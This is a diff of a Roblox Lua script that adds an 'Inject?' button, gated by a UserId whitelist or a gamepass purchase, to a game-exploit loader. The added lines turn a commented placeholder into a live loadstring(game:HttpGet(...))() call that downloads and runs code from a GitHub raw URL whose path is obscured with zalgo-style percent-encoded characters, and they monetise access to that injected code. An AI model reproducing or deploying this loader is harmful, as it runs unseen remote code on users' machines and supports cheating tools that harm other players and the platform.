@@ -1,73 +1,64 @@
--- Services
+--// Services
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local RunService = game:GetService("RunService")
-local TweenService = game:GetService("TweenService")
 
--- Player
+--// Player
 local player = Players.LocalPlayer
 
--- Configuration
-local GAMEPASS_ID = 12345678 -- Replace with your Gamepass ID
-local GAMEPASS_URL = "https://www.roblox.com/1596142188" -- Replace with your URL
-local LOADER_TIME = 3 -- seconds to simulate loading
+--// Config
+local GAMEPASS_ID = 1596142188
+local GAMEPASS_URL = "https://www.roblox.com/game-pass-url" -- replace with actual
+local LOADER_TIME = 2
 
--- Whitelist by UserId
+--// Whitelist multiple UserIds
 local WHITELISTED_USERIDS = {
-    12345678,
+    5624551389,
+    12345678,  -- add more UserIds here
     87654321,
-    1596142188,
 }
-local function isWhitelisted(userId)
-    for _, id in ipairs(WHITELISTED_USERIDS) do
-        if id == userId then
+
+local function isWhitelisted(id)
+    for _, v in ipairs(WHITELISTED_USERIDS) do
+        if v == id then
             return true
         end
     end
     return false
 end
 
--- UI Setup
+--// UI
 local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-local frame = Instance.new("Frame", screenGui)
-frame.Size = UDim2.new(0, 300, 0, 150)
-frame.Position = UDim2.new(0.5, -150, 0.5, -75)
-frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-frame.AnchorPoint = Vector2.new(0.5, 0.5)
+screenGui.IgnoreGuiInset = true
 
--- Button
 local button = Instance.new("TextButton")
-button.Size = UDim2.new(0, 200, 0, 50)
-button.Position = UDim2.new(0.5, -100, 0.7, 0)
-button.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+button.Parent = screenGui
+button.Size = UDim2.new(0, 280, 0, 50)
+button.Position = UDim2.new(0.5, -140, 0.5, -25)
+button.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 button.Font = Enum.Font.Arcade
-button.TextSize = 28
-button.TextColor3 = Color3.new(1,1,1)
+button.TextSize = 32
+button.TextColor3 = Color3.new(1, 1, 1)
 button.Text = "Inject?"
 button.AnchorPoint = Vector2.new(0.5, 0.5)
-button.Parent = frame
 
-local buttonCorner = Instance.new("UICorner")
-buttonCorner.CornerRadius = UDim.new(0, 12)
-buttonCorner.Parent = button
+local corner = Instance.new("UICorner", button)
+corner.CornerRadius = UDim.new(0, 12)
 
--- Loading Label
 local loading = Instance.new("TextLabel")
-loading.Size = UDim2.new(1, -20, 0, 60)
-loading.Position = UDim2.new(0, 10, 0, 10)
+loading.Parent = screenGui
+loading.Size = UDim2.new(0, 200, 0, 50)
+loading.Position = UDim2.new(0.5, -100, 0.5, -25)
 loading.BackgroundTransparency = 1
 loading.Font = Enum.Font.Arcade
+loading.TextSize = 32
 loading.TextColor3 = Color3.new(1,1,1)
-loading.TextScaled = true
-loading.TextWrapped = true
-loading.TextXAlignment = Enum.TextXAlignment.Center
-loading.TextYAlignment = Enum.TextYAlignment.Center
 loading.Text = "Loading"
 loading.Visible = false
-loading.Parent = frame
+loading.AnchorPoint = Vector2.new(0.5, 0.5)
 
--- Animated Loading
-local function animateLoadingText(label)
+--// Animated loader
+local function animateLoading(label)
     local states = {"Loading", "Loading.", "Loading..", "Loading..."}
     local index = 1
     while label.Visible do
@@ -77,22 +68,21 @@ local function animateLoadingText(label)
     end
 end
 
--- Loader / Injector
+--// Loader/Injecter
 local function startLoader()
-    frame.Visible = false
+    button.Visible = false
     loading.Visible = true
-    task.spawn(function() animateLoadingText(loading) end)
+    task.spawn(function() animateLoading(loading) end)
+
     task.wait(LOADER_TIME)
     loading.Visible = false
-    print("Injected! Player is whitelisted or owns gamepass.")
-    
-    -- Inject / execute your code here
-    -- Example placeholder:
-    print(">> Injecting script now...")
-    -- loadstring(game:HttpGet('YOUR_SCRIPT_URL', true))()
+
+    print("Injected! Player is whitelisted or owns gamepass:", player.UserId)
+    -- Replace with your actual inject code:
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/therangedpayeer/X-------------------------------------------------X-/refs/heads/main/%7C%CC%B4%CC%8D%CC%88%CC%90%CD%9D%CC%8F%CD%81%CC%8A%CC%8F%CC%9D%CC%9D%CC%A9%CC%B1%CC%A9%CC%B0%CC%96%CC%98%CC%97%CC%9D%CC%A7%CD%93%CC%A6%CC%A4%CC%97%CD%8D%CC%AA%CC%A8%CC%AA%CD%85%CD%85%CC%AC%CC%AB%CC%9F%CC%A2%CC%99%CD%94%CC%A7-%CC%B6%CD%86%CD%80%CD%8A%CC%80%CD%A0%CD%91%CD%9B%CD%92%CC%88%CC%83%CC%93%CC%92%CD%91%CC%92%CD%9D%CC%83%CC%9A%CC%BF%CD%83%CC%90%CC%91%CC%8B%CC%91%CC%91%CD%8B%CC%9B%CC%9B%CC%8B%CC%8F%CD%A0%CC%87%CC%81%CD%9C%CC%AC%CC%A0%CD%89%CC%96%CD%85%CD%9C%CC%B2%CC%9F%7C%CC%B7%CD%90%CC%BF%CC%82%CC%81%CD%83%CD%90%CC%90%CC%95%CC%93%CC%9A%CD%83%CC%87%CC%8A%CD%91%CC%BD%CD%82%CC%95%CC%9B%CD%9B%CD%9B%CC%BF%CC%93%CD%98%CD%8A%CD%8A%CC%BF%CD%84%CD%8C%CC%9A%CD%8A%CD%80%CD%84%CD%8C%CD%84%CC%90%CC%88%CC%A3%CD%8E%CC%B3%CC%A1%CC%BA%CC%A9%CD%9A%CC%AD%CC%A1", true))()
 end
 
--- Gamepass check
+--// Gamepass check
 local function ownsGamepass()
     local success, owns = pcall(function()
         return MarketplaceService:UserOwnsGamePassAsync(player.UserId, GAMEPASS_ID)
@@ -100,26 +90,22 @@ local function ownsGamepass()
     return success and owns
 end
 
--- Button click logic
+--// Button click
 button.MouseButton1Click:Connect(function()
-    local allowed = false
-
     if isWhitelisted(player.UserId) then
-        allowed = true
+        startLoader()
     elseif ownsGamepass() then
-        allowed = true
-    end
-
-    if allowed then
         startLoader()
     else
+        button.Text = "Gamepass Required"
+        button.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
         if setclipboard then setclipboard(GAMEPASS_URL) end
-        button.Text = "Gamepass not owned: URL Copied"
-        if RunService:IsStudio() then
-            print("Studio cannot show purchase prompt. Test live game.")
-        else
+        if not RunService:IsStudio() then
             MarketplaceService:PromptGamePassPurchase(player, GAMEPASS_ID)
         end
+        task.wait(2)
+        button.Text = "Inject?"
+        button.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
     end
 end)
 
